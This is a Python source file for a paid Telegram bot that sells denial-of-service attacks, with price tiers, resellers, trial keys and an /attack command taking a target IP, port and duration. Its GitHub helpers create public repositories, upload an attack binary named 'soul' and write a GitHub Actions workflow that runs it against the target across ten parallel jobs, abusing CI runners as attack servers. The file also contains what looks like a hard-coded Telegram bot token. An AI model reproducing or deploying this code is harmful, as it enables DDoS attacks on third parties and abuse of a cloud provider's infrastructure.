# =========================
# IMPORTS
# =========================
import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta

from telegram import Update
from telegram.ext import (
    Updater,
    CommandHandler,
    MessageHandler,
    Filters,
    ConversationHandler,
    CallbackContext
)

from github import Github, GithubException

# =========================
# LOGGING
# =========================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# =========================
# BOT CONFIG
# =========================
BOT_TOKEN = os.getenv("7395213244:AAFkHJQ9InXnnBWJtkpThY6qz9mL_l7wbls")

YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"

ADMIN_IDS = [5436530930, 2073188376]

# Conversation states
WAITING_FOR_BINARY = 1
WAITING_FOR_BROADCAST = 2
WAITING_FOR_OWNER_ADD = 3
WAITING_FOR_OWNER_DELETE = 4
WAITING_FOR_RESELLER_ADD = 5
WAITING_FOR_RESELLER_REMOVE = 6

# =========================
# GLOBAL STATE
# =========================
current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0

COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 40

user_attack_counts = {}

# =========================
# PRICING
# =========================
USER_PRICES = {
    "1": 120,
    "2": 240,
    "3": 360,
    "4": 450,
    "7": 650
}

RESELLER_PRICES = {
    "1": 150,
    "2": 250,
    "3": 300,
    "4": 400,
    "7": 550
}

# =========================
# FILE HELPERS
# =========================
def load_json(file_path, default):
    try:
        with open(file_path, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return default
    except Exception as e:
        logger.error(f"Failed to load {file_path}: {e}")
        return default

def save_json(file_path, data):
    try:
        with open(file_path, "w") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Failed to save {file_path}: {e}")

# =========================
# DATA STORES
# =========================
authorized_users = load_json("users.json", ADMIN_IDS.copy())
pending_users = load_json("pending_users.json", [])
approved_users = load_json("approved_users.json", {})
owners = load_json("owners.json", {})
admins = load_json("admins.json", {})
groups = load_json("groups.json", {})
resellers = load_json("resellers.json", {})
github_tokens = load_json("github_tokens.json", [])
trial_keys = load_json("trial_keys.json", {})
user_attack_counts = load_json("user_attack_counts.json", {})

attack_state = load_json("attack_state.json", {
    "current_attack": None,
    "cooldown_until": 0
})

maintenance_state = load_json("maintenance.json", {"maintenance": False})
cooldown_state = load_json("cooldown.json", {"cooldown": COOLDOWN_DURATION})
max_attack_state = load_json("max_attacks.json", {"max_attacks": MAX_ATTACKS})

current_attack = attack_state.get("current_attack")
cooldown_until = attack_state.get("cooldown_until", 0)
MAINTENANCE_MODE = maintenance_state.get("maintenance", False)
COOLDOWN_DURATION = cooldown_state.get("cooldown", COOLDOWN_DURATION)
MAX_ATTACKS = max_attack_state.get("max_attacks", MAX_ATTACKS)

# =========================
# SAVE HELPERS
# =========================
def save_users(data): save_json("users.json", data)
def save_pending_users(data): save_json("pending_users.json", data)
def save_approved_users(data): save_json("approved_users.json", data)
def save_owners(data): save_json("owners.json", data)
def save_admins(data): save_json("admins.json", data)
def save_groups(data): save_json("groups.json", data)
def save_resellers(data): save_json("resellers.json", data)
def save_github_tokens(data): save_json("github_tokens.json", data)
def save_trial_keys(data): save_json("trial_keys.json", data)
def save_user_attack_counts(data): save_json("user_attack_counts.json", data)

def save_attack_state():
    save_json("attack_state.json", {
        "current_attack": current_attack,
        "cooldown_until": cooldown_until
    })

def save_maintenance_mode(mode):
    save_json("maintenance.json", {"maintenance": mode})

def save_cooldown(duration):
    save_json("cooldown.json", {"cooldown": duration})

def save_max_attacks(value):
    save_json("max_attacks.json", {"max_attacks": value})

# =========================
# ROLE CHECKS
# =========================
def is_primary_owner(user_id):
    uid = str(user_id)
    return uid in owners and owners[uid].get("is_primary", False)

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_approved_user(user_id):
    uid = str(user_id)
    if uid in approved_users:
        expiry = approved_users[uid].get("expiry")
        if expiry == "LIFETIME":
            return True
        try:
            if time.time() < float(expiry):
                return True
        except:
            pass
        del approved_users[uid]
        save_approved_users(approved_users)
    return False

def can_user_attack(user_id):
    return (
        is_owner(user_id)
        or is_admin(user_id)
        or is_reseller(user_id)
        or is_approved_user(user_id)
    ) and not MAINTENANCE_MODE

# =========================
# ATTACK CONTROL
# =========================
def can_start_attack(user_id):
    global current_attack, cooldown_until

    if MAINTENANCE_MODE:
        return False, "Bot is under maintenance"

    uid = str(user_id)
    count = user_attack_counts.get(uid, 0)
    if count >= MAX_ATTACKS:
        return False, "Maximum attack limit reached"

    if current_attack is not None:
        return False, "Attack already running"

    if time.time() < cooldown_until:
        return False, f"Cooldown active ({int(cooldown_until - time.time())}s)"

    return True, "OK"

def start_attack(ip, port, duration, user_id, method):
    global current_attack

    current_attack = {
        "ip": ip,
        "port": port,
        "time": duration,
        "user_id": user_id,
        "method": method,
        "start_time": time.time(),
        "estimated_end_time": time.time() + int(duration)
    }

    uid = str(user_id)
    user_attack_counts[uid] = user_attack_counts.get(uid, 0) + 1

    save_user_attack_counts(user_attack_counts)
    save_attack_state()

def finish_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def get_attack_status():
    if current_attack:
        now = time.time()
        return {
            "status": "running",
            "attack": current_attack,
            "elapsed": int(now - current_attack["start_time"]),
            "remaining": max(0, int(current_attack["estimated_end_time"] - now))
        }

    if time.time() < cooldown_until:
        return {
            "status": "cooldown",
            "remaining_cooldown": int(cooldown_until - time.time())
        }

    return {"status": "ready"}
    
    # =========================
# BASIC COMMANDS
# =========================
def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if MAINTENANCE_MODE and not (is_owner(user_id) or is_admin(user_id)):
        update.message.reply_text(
            "🔧 BOT UNDER MAINTENANCE\nPlease wait until it is back online."
        )
        return

    if not can_user_attack(user_id):
        exists = any(str(u.get("user_id")) == str(user_id) for u in pending_users)
        if not exists:
            pending_users.append({
                "user_id": user_id,
                "username": update.effective_user.username or f"user_{user_id}",
                "request_date": time.strftime("%Y-%m-%d %H:%M:%S")
            })
            save_pending_users(pending_users)

            for owner_id in owners.keys():
                try:
                    context.bot.send_message(
                        chat_id=int(owner_id),
                        text=f"📥 New access request\nUser ID: {user_id}"
                    )
                except:
                    pass

        update.message.reply_text(
            "📋 Access request sent to admin.\nUse /id to get your user ID."
        )
        return

    role = "USER"
    if is_primary_owner(user_id):
        role = "PRIMARY OWNER"
    elif is_owner(user_id):
        role = "OWNER"
    elif is_admin(user_id):
        role = "ADMIN"
    elif is_reseller(user_id):
        role = "RESELLER"

    used = user_attack_counts.get(str(user_id), 0)
    remaining = MAX_ATTACKS - used

    update.message.reply_text(
        f"🤖 Welcome\nRole: {role}\n"
        f"Remaining attacks: {remaining}/{MAX_ATTACKS}\n\n"
        "/attack <ip> <port> <time>\n"
        "/status\n/stop\n/myaccess\n/help"
    )


def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if is_owner(user_id) or is_admin(user_id):
        update.message.reply_text(
            "/attack <ip> <port> <time>\n"
            "/status\n/stop\n/id\n/myaccess\n\n"
            "Admin:\n"
            "/add /remove\n/userslist\n/maintenance\n/setcooldown\n/setmaxattack\n"
            "/addtoken /tokens /removetoken\n"
            "/binary_upload /broadcast"
        )
    elif can_user_attack(user_id):
        update.message.reply_text(
            "/attack <ip> <port> <time>\n"
            "/status\n/stop\n/id\n/myaccess"
        )
    else:
        update.message.reply_text(
            "/id\n/help\n/redeem <key>"
        )


def id_command(update: Update, context: CallbackContext):
    user = update.effective_user
    update.message.reply_text(
        f"🆔 USER ID: {user.id}\nUSERNAME: @{user.username or 'N/A'}"
    )


def myaccess_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    role = "PENDING"
    expiry = "N/A"

    if is_primary_owner(user_id):
        role, expiry = "PRIMARY OWNER", "LIFETIME"
    elif is_owner(user_id):
        role, expiry = "OWNER", "LIFETIME"
    elif is_admin(user_id):
        role, expiry = "ADMIN", "LIFETIME"
    elif is_reseller(user_id):
        role = "RESELLER"
        expiry = resellers.get(str(user_id), {}).get("expiry", "LIFETIME")
    elif is_approved_user(user_id):
        role = "APPROVED USER"
        expiry = approved_users.get(str(user_id), {}).get("expiry")

    used = user_attack_counts.get(str(user_id), 0)
    remaining = MAX_ATTACKS - used

    update.message.reply_text(
        f"🔐 ACCESS INFO\n"
        f"Role: {role}\n"
        f"Expiry: {expiry}\n"
        f"Remaining attacks: {remaining}/{MAX_ATTACKS}"
    )


# =========================
# ATTACK COMMANDS
# =========================
def attack_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if not can_user_attack(user_id):
        update.message.reply_text("❌ You are not authorized.")
        return

    can_start, msg = can_start_attack(user_id)
    if not can_start:
        update.message.reply_text(msg)
        return

    if len(context.args) != 3:
        update.message.reply_text("Usage: /attack <ip> <port> <time>")
        return

    if not github_tokens:
        update.message.reply_text("❌ No servers available.")
        return

    ip, port, duration = context.args

    try:
        duration = int(duration)
        if duration <= 0:
            raise ValueError
    except ValueError:
        update.message.reply_text("❌ Invalid time.")
        return

    start_attack(ip, port, duration, user_id, "DEFAULT")

    msg = update.message.reply_text("🚀 Attack starting...")

    def auto_finish():
        time.sleep(duration)
        finish_attack()

    threading.Thread(target=auto_finish, daemon=True).start()

    update.message.reply_text(
        f"🎯 Attack started\n"
        f"Target: {ip}:{port}\n"
        f"Time: {duration}s\n"
        f"Servers: {len(github_tokens)}"
    )


def status_command(update: Update, context: CallbackContext):
    if not can_user_attack(update.effective_user.id):
        update.message.reply_text("❌ Access denied.")
        return

    status = get_attack_status()

    if status["status"] == "running":
        a = status["attack"]
        update.message.reply_text(
            f"🔥 RUNNING\n"
            f"{a['ip']}:{a['port']}\n"
            f"Elapsed: {status['elapsed']}s\n"
            f"Remaining: {status['remaining']}s"
        )
    elif status["status"] == "cooldown":
        update.message.reply_text(
            f"⏳ Cooldown: {status['remaining_cooldown']}s"
        )
    else:
        update.message.reply_text("✅ Ready. No attack running.")


def stop_command(update: Update, context: CallbackContext):
    if not can_user_attack(update.effective_user.id):
        update.message.reply_text("❌ Access denied.")
        return

    if current_attack is None:
        update.message.reply_text("❌ No active attack.")
        return

    finish_attack()
    update.message.reply_text(
        f"🛑 Attack stopped\nCooldown: {COOLDOWN_DURATION}s"
    )
    
    # =========================
# ADMIN / OWNER COMMANDS
# =========================
def add_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if not (is_owner(user_id) or is_admin(user_id)):
        update.message.reply_text("❌ Admin only command.")
        return

    if len(context.args) < 2:
        update.message.reply_text("Usage: /add <user_id> <days>")
        return

    try:
        new_user = int(context.args[0])
        days = int(context.args[1])

        pending_users[:] = [u for u in pending_users if str(u["user_id"]) != str(new_user)]
        save_pending_users(pending_users)

        if days == 0:
            expiry = "LIFETIME"
        else:
            expiry = time.time() + days * 86400

        approved_users[str(new_user)] = {
            "username": f"user_{new_user}",
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry": expiry,
            "days": days
        }
        save_approved_users(approved_users)

        try:
            context.bot.send_message(
                chat_id=new_user,
                text=f"✅ Access approved for {days} day(s).\nUse /start"
            )
        except:
            pass

        update.message.reply_text(f"✅ User {new_user} added.")

    except ValueError:
        update.message.reply_text("❌ Invalid arguments.")


def remove_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if not (is_owner(user_id) or is_admin(user_id)):
        update.message.reply_text("❌ Admin only command.")
        return

    if not context.args:
        update.message.reply_text("Usage: /remove <user_id>")
        return

    try:
        target = str(int(context.args[0]))
        removed = False

        if target in approved_users:
            del approved_users[target]
            save_approved_users(approved_users)
            removed = True

        pending_users[:] = [u for u in pending_users if str(u["user_id"]) != target]
        save_pending_users(pending_users)

        if target in user_attack_counts:
            del user_attack_counts[target]
            save_user_attack_counts(user_attack_counts)

        if removed:
            update.message.reply_text(f"✅ User {target} removed.")
        else:
            update.message.reply_text("❌ User not found.")

    except ValueError:
        update.message.reply_text("❌ Invalid user id.")


def userslist_command(update: Update, context: CallbackContext):
    if not (is_owner(update.effective_user.id) or is_admin(update.effective_user.id)):
        update.message.reply_text("❌ Admin only.")
        return

    if not approved_users:
        update.message.reply_text("No approved users.")
        return

    text = "👤 APPROVED USERS\n\n"
    for i, (uid, info) in enumerate(approved_users.items(), 1):
        expiry = info["expiry"]
        if expiry == "LIFETIME":
            rem = "LIFETIME"
        else:
            try:
                rem = int((float(expiry) - time.time()) / 86400)
                rem = f"{rem} days"
            except:
                rem = "UNKNOWN"
        text += f"{i}. {uid} | {rem}\n"

    update.message.reply_text(text)


# =========================
# MAINTENANCE & LIMITS
# =========================
def maintenance_command(update: Update, context: CallbackContext):
    global MAINTENANCE_MODE

    if not is_owner(update.effective_user.id):
        update.message.reply_text("❌ Owner only.")
        return

    if not context.args:
        update.message.reply_text("Usage: /maintenance on|off")
        return

    mode = context.args[0].lower()
    if mode == "on":
        MAINTENANCE_MODE = True
        save_maintenance_mode(True)
        update.message.reply_text("🔧 Maintenance ENABLED")
    elif mode == "off":
        MAINTENANCE_MODE = False
        save_maintenance_mode(False)
        update.message.reply_text("✅ Maintenance DISABLED")
    else:
        update.message.reply_text("Invalid option.")


def setcooldown_command(update: Update, context: CallbackContext):
    global COOLDOWN_DURATION

    if not is_owner(update.effective_user.id):
        update.message.reply_text("❌ Owner only.")
        return

    try:
        COOLDOWN_DURATION = int(context.args[0])
        save_cooldown(COOLDOWN_DURATION)
        update.message.reply_text(f"✅ Cooldown set to {COOLDOWN_DURATION}s")
    except:
        update.message.reply_text("Usage: /setcooldown <seconds>")


def setmaxattack_command(update: Update, context: CallbackContext):
    global MAX_ATTACKS

    if not is_owner(update.effective_user.id):
        update.message.reply_text("❌ Owner only.")
        return

    try:
        MAX_ATTACKS = int(context.args[0])
        save_max_attacks(MAX_ATTACKS)
        update.message.reply_text(f"✅ Max attacks set to {MAX_ATTACKS}")
    except:
        update.message.reply_text("Usage: /setmaxattack <number>")


# =========================
# TRIAL KEYS
# =========================
def generate_trial_key(hours):
    key = f"TRL-{''.join(random.choices(string.ascii_uppercase+string.digits, k=12))}"
    expiry = time.time() + hours * 3600

    trial_keys[key] = {
        "hours": hours,
        "expiry": expiry,
        "used": False
    }
    save_trial_keys(trial_keys)
    return key


def gentrailkey_command(update: Update, context: CallbackContext):
    if not (is_owner(update.effective_user.id) or is_admin(update.effective_user.id)):
        update.message.reply_text("❌ Admin only.")
        return

    try:
        hours = int(context.args[0])
        key = generate_trial_key(hours)
        update.message.reply_text(f"🔑 Trial key:\n{key}\nValid: {hours}h")
    except:
        update.message.reply_text("Usage: /gentrailkey <hours>")


def redeem_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if not context.args:
        update.message.reply_text("Usage: /redeem <key>")
        return

    key = context.args[0].upper()

    if key not in trial_keys:
        update.message.reply_text("❌ Invalid key.")
        return

    data = trial_keys[key]
    if data["used"]:
        update.message.reply_text("❌ Key already used.")
        return

    if time.time() > data["expiry"]:
        update.message.reply_text("❌ Key expired.")
        return

    expiry = time.time() + data["hours"] * 3600
    approved_users[str(user_id)] = {
        "username": f"user_{user_id}",
        "added_by": "trial",
        "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "expiry": expiry,
        "days": data["hours"] / 24,
        "trial": True
    }
    save_approved_users(approved_users)

    data["used"] = True
    save_trial_keys(trial_keys)

    update.message.reply_text("✅ Trial activated! Use /start")
    
    # =========================
# GITHUB HELPERS
# =========================
def create_repository(token, repo_name="soulcrack-tg"):
    g = Github(token)
    user = g.get_user()
    try:
        repo = user.get_repo(repo_name)
        return repo, False
    except GithubException:
        repo = user.create_repo(
            repo_name,
            description="VC DDOS Bot Repository",
            private=False,
            auto_init=False
        )
        return repo, True


def update_yml_file(token, repo_name, ip, port, time_val, method):
    yml_content = f"""name: soul Attack
on: [push]
jobs:
  soul:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x soul
    - run: sudo ./soul {ip} {port} {time_val} 999
"""
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        try:
            fc = repo.get_contents(YML_FILE_PATH)
            repo.update_file(
                YML_FILE_PATH,
                f"Update attack {ip}:{port}",
                yml_content,
                fc.sha
            )
        except:
            repo.create_file(
                YML_FILE_PATH,
                f"Create attack {ip}:{port}",
                yml_content
            )
        return True
    except Exception as e:
        logger.error(e)
        return False


def instant_stop_all_jobs(token, repo_name):
    total = 0
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        for status in ["queued", "in_progress", "pending"]:
            try:
                runs = repo.get_workflow_runs(status=status)
                for run in runs:
                    try:
                        run.cancel()
                        total += 1
                    except:
                        pass
            except:
                pass
    except:
        pass
    return total


# =========================
# TOKEN MANAGEMENT
# =========================
def addtoken_command(update: Update, context: CallbackContext):
    if not is_owner(update.effective_user.id):
        update.message.reply_text("❌ Owner only.")
        return

    if len(context.args) != 1:
        update.message.reply_text("Usage: /addtoken <github_token>")
        return

    token = context.args[0]
    try:
        g = Github(token)
        user = g.get_user()
        username = user.login

        repo, created = create_repository(token)

        github_tokens.append({
            "token": token,
            "username": username,
            "repo": f"{username}/soulcrack-tg",
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S")
        })
        save_github_tokens(github_tokens)

        update.message.reply_text(
            f"✅ Token added\nUser: {username}\nRepo: soulcrack-tg"
        )
    except Exception as e:
        update.message.reply_text(f"❌ Error: {e}")


def tokens_command(update: Update, context: CallbackContext):
    if not is_owner(update.effective_user.id):
        update.message.reply_text("❌ Owner only.")
        return

    if not github_tokens:
        update.message.reply_text("No servers.")
        return

    msg = "🔑 SERVERS LIST\n\n"
    for i, t in enumerate(github_tokens, 1):
        msg += f"{i}. {t['username']} | {t['repo']}\n"
    msg += f"\nTotal: {len(github_tokens)}"
    update.message.reply_text(msg)


def removetoken_command(update: Update, context: CallbackContext):
    if not is_owner(update.effective_user.id):
        update.message.reply_text("❌ Owner only.")
        return

    try:
        idx = int(context.args[0]) - 1
        removed = github_tokens.pop(idx)
        save_github_tokens(github_tokens)
        update.message.reply_text(f"✅ Removed {removed['username']}")
    except:
        update.message.reply_text("Usage: /removetoken <number>")


# =========================
# BROADCAST
# =========================
def broadcast_command(update: Update, context: CallbackContext):
    if not is_owner(update.effective_user.id):
        update.message.reply_text("❌ Owner only.")
        return ConversationHandler.END

    update.message.reply_text("📢 Send broadcast message:")
    return WAITING_FOR_BROADCAST


def broadcast_message_handler(update: Update, context: CallbackContext):
    message = update.message.text
    users = set()

    for d in (approved_users, resellers, admins, owners):
        for uid in d.keys():
            users.add(int(uid))

    sent = 0
    for uid in users:
        try:
            context.bot.send_message(uid, f"📢 BROADCAST\n\n{message}")
            sent += 1
            time.sleep(0.1)
        except:
            pass

    update.message.reply_text(f"✅ Broadcast sent to {sent} users")
    return ConversationHandler.END


# =========================
# BINARY UPLOAD
# =========================
def binary_upload_command(update: Update, context: CallbackContext):
    if not is_owner(update.effective_user.id):
        update.message.reply_text("❌ Owner only.")
        return ConversationHandler.END

    update.message.reply_text("📤 Send binary file")
    return WAITING_FOR_BINARY


def handle_binary_file(update: Update, context: CallbackContext):
    doc = update.message.document
    if not doc:
        update.message.reply_text("❌ Send a file.")
        return WAITING_FOR_BINARY

    file = doc.get_file()
    path = f"temp_{update.effective_user.id}.bin"
    file.download(path)

    with open(path, "rb") as f:
        content = f.read()

    success = 0
    for t in github_tokens:
        try:
            g = Github(t["token"])
            repo = g.get_repo(t["repo"])
            try:
                fc = repo.get_contents(BINARY_FILE_NAME)
                repo.update_file(BINARY_FILE_NAME, "Update binary", content, fc.sha)
            except:
                repo.create_file(BINARY_FILE_NAME, "Upload binary", content)
            success += 1
        except:
            pass

    os.remove(path)
    update.message.reply_text(f"✅ Binary uploaded to {success} servers")
    return ConversationHandler.END
    
    
  # =========================
# CONVERSATION CANCEL
# =========================
def cancel_command(update: Update, context: CallbackContext):
    update.message.reply_text("❌ Operation cancelled.")
    return ConversationHandler.END


# =========================
# MESSAGE FALLBACK
# =========================
def handle_message(update: Update, context: CallbackContext):
    if update.message and update.message.text and update.message.text.startswith("/"):
        return
    # silent fallback (as requested)
    return


# =========================
# MAIN
# =========================
def main():
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN not set")
        return

    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    # =====================
    # CONVERSATIONS
    # =====================
    conv_binary = ConversationHandler(
        entry_points=[CommandHandler("binary_upload", binary_upload_command)],
        states={
            WAITING_FOR_BINARY: [
                MessageHandler(Filters.document.all, handle_binary_file),
                CommandHandler("cancel", cancel_command),
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel_command)],
    )

    conv_broadcast = ConversationHandler(
        entry_points=[CommandHandler("broadcast", broadcast_command)],
        states={
            WAITING_FOR_BROADCAST: [
                MessageHandler(Filters.text & ~Filters.command, broadcast_message_handler),
                CommandHandler("cancel", cancel_command),
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel_command)],
    )

    dp.add_handler(conv_binary)
    dp.add_handler(conv_broadcast)

    # =====================
    # USER COMMANDS
    # =====================
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help_command))
    dp.add_handler(CommandHandler("id", id_command))
    dp.add_handler(CommandHandler("myaccess", myaccess_command))
    dp.add_handler(CommandHandler("attack", attack_command))
    dp.add_handler(CommandHandler("status", status_command))
    dp.add_handler(CommandHandler("stop", stop_command))
    dp.add_handler(CommandHandler("redeem", redeem_command))

    # =====================
    # ADMIN / OWNER
    # =====================
    dp.add_handler(CommandHandler("add", add_command))
    dp.add_handler(CommandHandler("remove", remove_command))
    dp.add_handler(CommandHandler("userslist", userslist_command))
    dp.add_handler(CommandHandler("maintenance", maintenance_command))
    dp.add_handler(CommandHandler("setcooldown", setcooldown_command))
    dp.add_handler(CommandHandler("setmaxattack", setmaxattack_command))
    dp.add_handler(CommandHandler("gentrailkey", gentrailkey_command))

    # =====================
    # TOKENS / SERVERS
    # =====================
    dp.add_handler(CommandHandler("addtoken", addtoken_command))
    dp.add_handler(CommandHandler("tokens", tokens_command))
    dp.add_handler(CommandHandler("removetoken", removetoken_command))

    # =====================
    # FALLBACK
    # =====================
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

    # =====================
    # START
    # =====================
    print("🤖 BOT RUNNING")
    print("━━━━━━━━━━━━━━━━━━━━━━")
    print(f"Owners: {len(owners)} | Admins: {len(admins)} | Users: {len(approved_users)}")
    print(f"Servers: {len(github_tokens)}")
    print(f"Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}")
    print(f"Cooldown: {COOLDOWN_DURATION}s | Max attacks: {MAX_ATTACKS}")
    print("━━━━━━━━━━━━━━━━━━━━━━")

    updater.start_polling()
    updater.idle()


if __name__ == "__main__":
    main()
    
   
